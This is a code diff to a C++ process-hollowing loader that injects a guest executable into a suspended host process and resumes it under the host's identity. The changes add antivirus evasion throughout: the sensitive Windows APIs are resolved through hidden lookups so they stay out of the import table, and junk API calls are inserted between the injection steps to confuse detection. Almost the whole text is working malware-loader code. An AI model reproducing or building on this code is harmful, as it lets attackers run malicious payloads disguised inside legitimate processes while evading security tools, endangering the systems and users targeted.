@@ -1,5 +1,4 @@
 #include "processHollower.h"
-#include "debug.h"
 
 
 ProcessHollower::ProcessHollower() {
@@ -7,6 +6,16 @@ ProcessHollower::ProcessHollower() {
     pGuestPEHeaders = new PE_HEADERS;
     dwHostImageBaseAddress = 0;
     lpHostProcessInformation = new PROCESS_INFORMATION();
+
+    HiddenCreateProcessA = nullptr;
+    HiddenNtUnmapViewOfSection = nullptr;
+    HiddenVirtualAllocEx = nullptr;
+    HiddenWriteProcessMemory = nullptr;
+    HiddenVirtualProtectEx = nullptr;
+    HiddenGetThreadContext = nullptr;
+    HiddenSetThreadContext = nullptr;
+    HiddenResumeThread = nullptr;
+    HiddenReadProcessMemory = nullptr;
 }
 
 ProcessHollower::~ProcessHollower() {
@@ -17,31 +26,76 @@ ProcessHollower::~ProcessHollower() {
 }
 
 BOOL ProcessHollower::execute(char *lpHostApplicationName, LPVOID lpGuestPEData) {
+    if (!ResolveHiddenImports())
+        return FALSE;
+
     DebugInfoMessage("Starting Process Hollowing");
     GetGuestPEData(lpGuestPEData);
     if (!CreateHostProcess(lpHostApplicationName))
         return FALSE;
+    // Junk API call
+    callGetMenu();
     if (!GetHostProcessBaseAddress()) {
         TerminateHostProcess();
         return FALSE;
     }
+    // Junk API call
+    callIsTextUnicode();
     if (!UnmapHostProcessMemory()) {
         TerminateHostProcess();
         return FALSE;
     }
+    // Junk API call
+    callGetCursorPos();
     if (!AllocateProcessMemory()) {
         TerminateHostProcess();
         return FALSE;
     }
+    // Junk API call
+    callHeapFunctions();
     if (!InjectGuestPE()) {
         TerminateHostProcess();
         return FALSE;
     }
+    // Junk API call
+    callGetParent();
     if (!JumpToEntryPoint()) {
         TerminateHostProcess();
         return FALSE;
     }
     DebugSuccessMessage("Successfully executed Process Hollowing. Enjoy!");
+    return TRUE;
+}
+
+BOOL ProcessHollower::ResolveHiddenImports() {
+    HiddenCreateProcessA = GetHiddenCreateProcessA();
+    if (!HiddenCreateProcessA)
+        return FALSE;
+    HiddenNtUnmapViewOfSection = GetHiddenNtUnmapViewOfSection();
+    if (!HiddenNtUnmapViewOfSection)
+        return FALSE;
+    HiddenWriteProcessMemory = GetHiddenWriteProcessMemory();
+    if (!HiddenWriteProcessMemory)
+        return FALSE;
+    HiddenVirtualAllocEx = GetHiddenVirtualAllocEx();
+    if (!HiddenVirtualAllocEx)
+        return FALSE;
+    HiddenVirtualProtectEx = GetHiddenVirtualProtectEx();
+    if (!HiddenVirtualProtectEx)
+        return FALSE;
+    HiddenGetThreadContext = GetHiddenGetThreadContext();
+    if (!HiddenGetThreadContext)
+        return FALSE;
+    HiddenSetThreadContext = GetHiddenSetThreadContext();
+    if (!HiddenSetThreadContext)
+        return FALSE;
+    HiddenResumeThread = GetHiddenResumeThread();
+    if (!HiddenResumeThread)
+        return FALSE;
+    HiddenReadProcessMemory = GetReadProcessMemory();
+    if (!HiddenReadProcessMemory)
+        return FALSE;
+
     return TRUE;
 }
 
@@ -53,7 +107,9 @@ VOID ProcessHollower::GetGuestPEData(LPVOID lpBuffer) {
 BOOL ProcessHollower::CreateHostProcess(char *lpHostApplicationName) {
     DebugInfoMessage("Creating Host Process");
     auto lpStartupInfo = new STARTUPINFOA();
-    bool bSuccess = CreateProcess(lpHostApplicationName, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, lpStartupInfo, lpHostProcessInformation);
+    BOOL bSuccess = HiddenCreateProcessA(lpHostApplicationName, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED,
+                                            nullptr, nullptr, lpStartupInfo, lpHostProcessInformation);
+
     if (!bSuccess)
         DebugErrorMessage("Failed to create Host Process");
     DebugSuccessMessage("Successfully created Host Process");
@@ -76,10 +132,7 @@ BOOL ProcessHollower::GetHostProcessBaseAddress() {
 
 BOOL ProcessHollower::UnmapHostProcessMemory() {
     DebugInfoMessage("Unmapping Host Process memory");
-    HMODULE hNTDLL = GetModuleHandleA("ntdll");
-    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
-    auto NtUnmapViewOfSection = (_NtUnmapViewOfSection) fpNtUnmapViewOfSection;
-    DWORD dwStatus = NtUnmapViewOfSection(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress);
+    DWORD dwStatus = HiddenNtUnmapViewOfSection(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress);
     if (dwStatus != STATUS_SUCCESS) {
         DebugErrorMessage("Failed to unmap Host Process memory");
         return FALSE;
@@ -90,9 +143,9 @@ BOOL ProcessHollower::UnmapHostProcessMemory() {
 
 BOOL ProcessHollower::AllocateProcessMemory() {
     DebugInfoMessage("Allocating memory for Guest PE into Host Process");
-    // if there are no relocations, process should be inserted in injected PE BaseAddress, and later change PEB base address field before jumping to entry point
-    // attention lpBaseAddress might not be the same as dwHostImageBaseAddress and then we would not be considering the correct address!!
-    LPVOID lpBaseAddress = VirtualAllocEx(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress, pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID lpBaseAddress = HiddenVirtualAllocEx(lpHostProcessInformation->hProcess, (PVOID) dwHostImageBaseAddress,
+                                                   pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfImage,
+                                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (lpBaseAddress == nullptr) {
         DebugErrorMessage("Failed to allocate memory for Guest PE into Host Process");
         return FALSE;
@@ -131,7 +184,8 @@ BOOL ProcessHollower::InjectGuestPE() {
 
 BOOL ProcessHollower::WriteProcessSection(VIRTUAL_ADDRESS lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize) {
     SIZE_T lpNumberOfBytesWritten;
-    BOOL bSuccess = WriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &lpNumberOfBytesWritten);
+    BOOL bSuccess = HiddenWriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID) lpBaseAddress, lpBuffer, nSize,
+            &lpNumberOfBytesWritten);
     return bSuccess && nSize == lpNumberOfBytesWritten;
 }
 
@@ -183,10 +237,10 @@ BOOL ProcessHollower::ApplyBlockRelocations(DWORD dwEntryCount, DWORD &dwOffset,
             continue;
         }
         dwAddressToRelocate = dwHostImageBaseAddress + pBlockHeader->PageAddress + pBlocks[entry].Offset;
-        if (!ReadProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
+        if (!HiddenReadProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
             return FALSE;
         dwAddressToRelocateValue += dwRelocationDelta;
-        if (!WriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
+        if (!HiddenWriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
             return FALSE;
         dwOffset += sizeof(BASE_RELOCATION_ENTRY);
     }
@@ -197,7 +251,7 @@ BOOL ProcessHollower::SetSectionsPermissions() {
     DebugInfoMessage("Setting permissions for each section");
     DWORD dwFlOldProtect;
     DWORD dwMemProtectionFlag;
-    if (!VirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) dwHostImageBaseAddress,  pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwFlOldProtect)) {
+    if (!HiddenVirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) dwHostImageBaseAddress,  pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwFlOldProtect)) {
         DebugErrorMessage("Failed to set header permissions");
         return FALSE;
     }
@@ -205,7 +259,8 @@ BOOL ProcessHollower::SetSectionsPermissions() {
         if (!pGuestPEHeaders->SectionHeaders[i].PointerToRawData)
             continue;
         dwMemProtectionFlag = GetMemProtectionFlag(pGuestPEHeaders->SectionHeaders[i].Characteristics);
-        if (!VirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) (dwHostImageBaseAddress + pGuestPEHeaders->SectionHeaders[i].VirtualAddress),  pGuestPEHeaders->SectionHeaders[i].SizeOfRawData, dwMemProtectionFlag, &dwFlOldProtect)) {
+        if (!HiddenVirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) (dwHostImageBaseAddress + pGuestPEHeaders->SectionHeaders[i].VirtualAddress),
+                                       pGuestPEHeaders->SectionHeaders[i].SizeOfRawData, dwMemProtectionFlag, &dwFlOldProtect)) {
             DebugErrorMessage("Failed to set permissions of a section");
             DebugData("Section", (VIRTUAL_ADDRESS)pGuestPEHeaders->SectionHeaders[i].Name, FORMAT_SECTION);
             return FALSE;
@@ -227,14 +282,14 @@ BOOL ProcessHollower::JumpToEntryPoint() {
     DebugInfoMessage("Setting process entry point and resuming execution");
     auto pContext = new CONTEXT();
     pContext->ContextFlags = CONTEXT_INTEGER;
-    if (!GetThreadContext(lpHostProcessInformation->hThread, pContext)) {
+    if (!HiddenGetThreadContext(lpHostProcessInformation->hThread, pContext)) {
         DebugErrorMessage("Failed to get Thread Context");
         return FALSE;
     }
     VIRTUAL_ADDRESS dwEntrypoint = dwHostImageBaseAddress + pGuestPEHeaders->NTHeaders->OptionalHeader.AddressOfEntryPoint;
     SetEntryPoint(pContext, dwEntrypoint);
-    SetThreadContext(lpHostProcessInformation->hThread, pContext);
-    if (!ResumeThread(lpHostProcessInformation->hThread)) {
+    HiddenSetThreadContext(lpHostProcessInformation->hThread, pContext);
+    if (!HiddenResumeThread(lpHostProcessInformation->hThread)) {
         DebugErrorMessage("Failed to resume thread");
         return FALSE;
     }
